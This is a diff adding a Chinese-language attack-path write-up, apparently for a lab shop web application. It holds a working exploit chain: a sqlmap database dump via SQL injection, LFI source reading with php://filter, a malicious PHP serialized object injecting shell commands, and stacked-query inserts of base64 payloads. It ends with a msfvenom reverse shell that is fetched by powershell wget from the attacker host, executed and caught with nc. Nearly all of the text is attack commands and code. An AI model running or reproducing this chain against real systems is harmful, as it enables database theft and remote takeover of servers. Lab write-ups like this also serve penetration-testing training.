@@ -1,0 +1,59 @@
+攻擊路徑
+1. 攻擊者發現後台product_info.php有sql injection
+/shop/dashboard/?page=product_info.php&id=1"
+
+2. 先用burp拿PHPSESSID，sqlmap倒出資料庫
+sqlmap -u "http://192.168.1.201/shop/dashboard/?page=product_info.php&id=1" --cookie "PHPSESSID=rgo8v23n6almn4gimjggbcjdgk" -p id --dump
+
+3. 攻擊者發現products的attributes有序列化字串，並且可由sql injection任意插入資料
+
+4. 攻擊者利用LFI查看原始碼是否有可利用反序列化的class，由index.php可得知引入common.php
+/shop/dashboard/?page=php://filter/convert.base64-encode/resource=index.php
+
+5. 查看common.php原始碼，發現ApiTester class可進行利用
+/shop/dashboard/?page=php://filter/convert.base64-encode/resource=common.php 
+
+6. 使用php產生惡意序列化字串，並利用sql injection插入資料
+```
+<?php
+class ApiTester {
+    public $ip;
+    private $res = "' && curl 192.168.1.105 && echo'";
+
+    public function __construct($ip) {
+        $this->ip = $ip;
+    }
+
+    public function __invoke() {
+        $this->res = system("ping " . $this->ip);
+    }
+
+    public function __destruct() {
+        system("echo '" . $this->res . "' > C:/logs/test.log");
+    }
+}
+$api = new ApiTester('127.0.0.1');
+$payload = base64_encode(serialize($api));
+echo $payload;
+```
+
+/shop/dashboard/?page=product_info.php&id=1%3b+INSERT+INTO+products+(name,+description,+category,+price,+attributes)+VALUES('evil',+'evil',+'evil',+0.00,+FROM_BASE64('Tzo5OiJBcGlUZXN0ZXIiOjI6e3M6MjoiaXAiO3M6OToiMTI3LjAuMC4xIjtzOjE0OiIAQXBpVGVzdGVyAHJlcyI7czozMjoiJyAmJiBjdXJsIDE5Mi4xNjguMS4xMDUgJiYgZWNobyciO30%3d')) 
+
+7. 訪問product_info.php頁面觸發反序列化指令(設計為無回顯cmd)
+/shop/dashboard/?page=product_info.php&id=7
+
+------------
+
+RCE
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.105 LPORT=8888 -f exe -o r.exe
+python -m http.server 80
+```
+private $res = "' && powershell wget 192.168.1.105/r.exe -O C:/logs/r.exe && echo'";
+```
+/shop/dashboard/?page=product_info.php&id=1%3b+INSERT+INTO+products+(name,+description,+category,+price,+attributes)+VALUES('evil',+'evil',+'evil',+0.00,+FROM_BASE64('Tzo5OiJBcGlUZXN0ZXIiOjI6e3M6MjoiaXAiO3M6OToiMTI3LjAuMC4xIjtzOjE0OiIAQXBpVGVzdGVyAHJlcyI7czo2MDoiJyAmJiBwb3dlcnNoZWxsIHdnZXQgMTkyLjE2OC4xLjEwNSAtTyBDOi9sb2dzL3IuZXhlICYmIGVjaG8nIjt9'))
+訪問product_info.php?id=??
+```
+private $res = "' && C:/logs/r.exe && echo'";
+```
+nc -nvlp 8888
+訪問product_info.php?id=??
